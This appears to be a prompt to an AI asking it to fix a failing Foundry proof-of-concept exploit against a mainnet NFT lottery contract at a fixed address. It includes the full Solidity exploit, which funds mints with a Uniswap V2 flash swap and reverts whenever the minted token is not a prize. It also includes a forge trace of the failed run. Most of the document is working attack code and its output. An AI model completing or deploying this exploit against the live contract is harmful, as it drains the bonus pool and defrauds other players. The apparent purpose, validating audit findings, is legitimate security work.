You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Contract callers can revert losing mints and keep only winning outcomes
- claim: A wrapper contract can call `freeMint` or `publicMint`, let the mint logic fully determine whether the token is lucky and whether prize ETH was paid, inspect the outcome after the call returns, and revert the outer transaction whenever the outcome is unfavorable. Because a revert rolls back the mint, payment, and whitelist consumption, the attacker can cheaply retry until only profitable outcomes are finalized.
- impact: This turns the lottery into a one-sided option for contract callers. In `publicMint`, the attacker only commits winning mints and loses only gas on failed attempts, allowing extraction from the bonus pool. In `freeMint`, the attacker can repeatedly retry the same whitelist slot until a lucky result appears, then finalize the free NFT plus payout. The bonus pool can be drained and the game becomes economically non-viable.
- exploit_paths: ["Attacker deploys a contract implementing `onERC721Received` and a cheap `receive()` function.", "The wrapper calls `publicMint()` or `freeMint(victim)` and waits for the call to return.", "After return, the wrapper inspects whether the minted token is marked lucky or whether it received the ETH payout.", "If the outcome is losing, the wrapper reverts, rolling back the mint and any whitelist consumption; if the outcome is winning, it does not revert and keeps the NFT/payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILuckyTiger {
    function pauseMint() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function maxTotal() external view returns (uint256);
    function price() external view returns (uint256);
    function publicMint() external payable;
    function ownerOf(uint256 tokenId) external view returns (address);
    function isPrize(uint256 tokenId) external view returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC721Receiver {
    error MintPaused();
    error SoldOut();
    error ZeroPrice();
    error InsufficientBonusPool(uint256 balance, uint256 required);
    error UnexpectedCallbackSender(address sender);
    error UnexpectedPairCaller(address caller);
    error UnluckyOutcome(uint256 tokenId);
    error TokenNotOwned(uint256 tokenId);
    error FlashLoanNotNeeded();
    error FlashLoanNotRepaid();
    error NoNetProfit();

    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair public constant UNISWAP_V2_USDC_WETH =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 private constant FLASH_BPS_DENOMINATOR = 1000;
    uint256 private constant FLASH_BPS_NUMERATOR = 997;

    uint256 public mintedTokenId;
    uint256 public lastBorrowAmount;
    uint256 public lastRepaymentAmount;
    bool public hypothesisValidated;

    uint256 private _profitAmount;
    bool private _flashInProgress;

    constructor() {}

    function executeOnOpportunity() external {
        if (TARGET.pauseMint()) revert MintPaused();
        if (TARGET.totalSupply() >= TARGET.maxTotal()) revert SoldOut();

        uint256 mintPrice = TARGET.price();
        if (mintPrice == 0) revert ZeroPrice();

        // A winning public mint pays out 190% of price to the caller and 10% to the
        // withdraw address after receiving only 100% in msg.value, so the contract must
        // already have at least one extra `price` in its bonus pool for a winning attempt
        // to finalize successfully.
        if (address(TARGET).balance < mintPrice) {
            revert InsufficientBonusPool(address(TARGET).balance, mintPrice);
        }

        uint256 startingValue = address(this).balance + WETH.balanceOf(address(this));
        _ensureNativeCapital(mintPrice);

        if (address(this).balance >= mintPrice) {
            _attemptDirect(mintPrice);
        } else {
            _attemptWithFlashSwap(mintPrice);
        }

        _wrapAllEth();

        uint256 endingValue = WETH.balanceOf(address(this));
        if (endingValue <= startingValue) revert NoNetProfit();

        _profitAmount = endingValue - startingValue;
        hypothesisValidated = true;
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256, uint256 amount1, bytes calldata) external {
        if (msg.sender != address(UNISWAP_V2_USDC_WETH)) revert UnexpectedPairCaller(msg.sender);
        if (sender != address(this)) revert UnexpectedCallbackSender(sender);
        if (!_flashInProgress) revert FlashLoanNotNeeded();

        uint256 mintPrice = TARGET.price();
        lastBorrowAmount = amount1;

        WETH.withdraw(amount1);

        uint256 tokenId = TARGET.totalSupply() + 1;

        // Path stage 1: the wrapper contract calls publicMint() and lets the target finish
        // all mint, prize, and payout logic before deciding whether to keep the result.
        TARGET.publicMint{value: mintPrice}();

        // Path stage 2: only after publicMint() returns does the wrapper inspect the outcome.
        // We intentionally do not precompute the pseudo-random bit, to stay aligned with the
        // original finding: the caller learns whether the mint was winning after completion.
        if (!TARGET.isPrize(tokenId)) {
            // Path stage 3: on an unfavorable outcome, revert the outer transaction so the mint,
            // payment, and all intermediate state are rolled back atomically.
            revert UnluckyOutcome(tokenId);
        }

        if (TARGET.ownerOf(tokenId) != address(this)) revert TokenNotOwned(tokenId);

        mintedTokenId = tokenId;

        uint256 repayment = _flashRepayment(amount1);
        lastRepaymentAmount = repayment;

        WETH.deposit{value: repayment}();
        bool ok = WETH.transfer(address(UNISWAP_V2_USDC_WETH), repayment);
        if (!ok) revert FlashLoanNotRepaid();

        _flashInProgress = false;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    function _attemptDirect(uint256 mintPrice) internal {
        uint256 tokenId = TARGET.totalSupply() + 1;

        TARGET.publicMint{value: mintPrice}();

        // If the current fork timestamp/difficulty resolves the mint to a losing branch,
        // this revert is the concrete mechanical reason no profitable finalization exists on
        // this exact state without advancing to a later block.
        if (!TARGET.isPrize(tokenId)) revert UnluckyOutcome(tokenId);
        if (TARGET.ownerOf(tokenId) != address(this)) revert TokenNotOwned(tokenId);

        mintedTokenId = tokenId;
    }

    function _attemptWithFlashSwap(uint256 mintPrice) internal {
        _flashInProgress = true;

        uint256 repayment = _flashRepayment(mintPrice);
        if (repayment <= mintPrice) revert FlashLoanNotNeeded();

        // Borrow WETH directly from an existing deep mainnet pool, unwrap to ETH, mint, and
        // repay in the same transaction. This only changes funding implementation, not exploit
        // causality: the profit still comes solely from keeping winning publicMint outcomes.
        UNISWAP_V2_USDC_WETH.swap(0, mintPrice, address(this), abi.encode(mintPrice));

        if (_flashInProgress) revert FlashLoanNotRepaid();
    }

    function _ensureNativeCapital(uint256 mintPrice) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance >= mintPrice) return;

        uint256 missing = mintPrice - ethBalance;
        uint256 wethBalance = WETH.balanceOf(address(this));

        if (wethBalance >= missing) {
            WETH.withdraw(missing);
        }
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * FLASH_BPS_DENOMINATOR) / FLASH_BPS_NUMERATOR) + 1;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.24s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 199902)
Traces:
  [199902] FlawVerifierTest::testExploit()
    ├─ [300] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [187342] FlawVerifier::executeOnOpportunity()
    │   ├─ [2566] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::pauseMint() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [4674] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::totalSupply() [staticcall]
    │   │   └─ ← [Return] 211
    │   ├─ [440] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::maxTotal() [staticcall]
    │   │   └─ ← [Return] 1000
    │   ├─ [2474] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::price() [staticcall]
    │   │   └─ ← [Return] 10000000000000000 [1e16]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [145138] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::swap(0, 10000000000000000 [1e16], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000000000000000002386f26fc10000)
    │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000 [1e16])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000b4e16d0168e52d35cacd2c6185b44281ec28c9dc
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [103412] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 10000000000000000 [1e16], 0x000000000000000000000000000000000000000000000000002386f26fc10000)
    │   │   │   ├─ [474] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::price() [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000 [1e16]
    │   │   │   ├─ [9207] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(10000000000000000 [1e16])
    │   │   │   │   ├─ [67] FlawVerifier::receive{value: 10000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [674] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 211
    │   │   │   ├─ [59878] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::publicMint{value: 10000000000000000}()
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 3: 0x00000000000000000000000000000000000000000000000000000000000000d4
    │   │   │   │   │           data: 0x
    │   │   │   │   ├─ [539] FlawVerifier::onERC721Received(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 212, 0x)
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   ├─  emit topic 0: 0x6dd0b1196e80c465d51f2d7a9488c932354b5b80e48a0e074a1e964081efcc90
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000d40000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [1423] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::isPrize(212) [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   └─ ← [Revert] UnluckyOutcome(212)
    │   │   └─ ← [Revert] UnluckyOutcome(212)
    │   └─ ← [Revert] UnluckyOutcome(212)
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.60s (264.65ms CPU time)

Ran 1 test suite in 1.74s (1.60s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 199902)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
